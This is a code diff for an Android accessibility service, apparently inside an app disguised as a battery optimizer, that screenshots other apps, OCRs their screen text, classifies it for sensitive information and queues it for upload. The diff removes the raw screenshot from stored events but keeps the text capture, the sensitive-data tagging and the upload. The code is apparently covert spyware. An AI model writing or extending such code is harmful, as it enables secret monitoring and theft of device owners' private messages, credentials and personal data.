@@ -6,7 +6,6 @@ import android.graphics.Bitmap
 import android.util.Base64
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import com.android.batteryoptimization.network.OcrDetailPayload
 import com.android.batteryoptimization.ocr.OcrEngine
 import com.android.batteryoptimization.ocr.OcrResult
 import com.google.gson.Gson
@@ -131,34 +130,18 @@ class InputAccessibilityService : AccessibilityService() {
                 return
             }
 
-            // 压缩截图为 base64（用于上传）
-            val screenshotBase64 = bitmapToBase64(bitmap)
-
-            // OCR 详细结果
-            val fullText = ocrResults.joinToString("\n") { it.text }
-            val details = ocrResults.map { r ->
-                OcrDetailPayload(
-                    text = r.text,
-                    confidence = r.confidence,
-                    boundingBox = r.box?.let { "${it.left},${it.top},${it.right},${it.bottom}" }
-                )
-            }
-            val detailsJson = gson.toJson(details)
-
             // 内容分类
+            val fullText = ocrResults.joinToString("\n") { it.text }
             val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(packageName, fullText)
             val sensitiveInfoJson = gson.toJson(sensitiveInfo)
 
             Log.d(TAG, "Auto OCR classify: type=$contentType risk=$riskLevel sensitive=$sensitiveInfo")
 
-            // 存入事件流
+            // 存入事件流（每条文本存为一条事件，上传时会按时间戳分组）
             repository.addOcrEvents(
                 packageName = packageName,
                 appName = appName,
                 results = ocrResults,
-                screenshotBase64 = screenshotBase64,
-                ocrFullText = fullText,
-                ocrDetailsJson = detailsJson,
                 contentType = contentType,
                 riskLevel = riskLevel,
                 sensitiveInfoJson = sensitiveInfoJson
@@ -184,16 +167,6 @@ class InputAccessibilityService : AccessibilityService() {
                         val ocrResults = ocrEngine?.recognize(bitmap) ?: emptyList()
                         if (ocrResults.isNotEmpty()) {
                             val fullText = ocrResults.joinToString("\n") { it.text }
-                            val details = ocrResults.map { r ->
-                                OcrDetailPayload(
-                                    text = r.text,
-                                    confidence = r.confidence,
-                                    boundingBox = r.box?.let { "${it.left},${it.top},${it.right},${it.bottom}" }
-                                )
-                            }
-                            val detailsJson = gson.toJson(details)
-                            val screenshotBase64 = bitmapToBase64(bitmap)
-
                             val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(packageName = "screenshot", text = fullText)
                             val sensitiveInfoJson = gson.toJson(sensitiveInfo)
 
@@ -201,9 +174,6 @@ class InputAccessibilityService : AccessibilityService() {
                                 packageName = "screenshot",
                                 appName = "Screen OCR",
                                 results = ocrResults,
-                                screenshotBase64 = screenshotBase64,
-                                ocrFullText = fullText,
-                                ocrDetailsJson = detailsJson,
                                 contentType = contentType,
                                 riskLevel = riskLevel,
                                 sensitiveInfoJson = sensitiveInfoJson
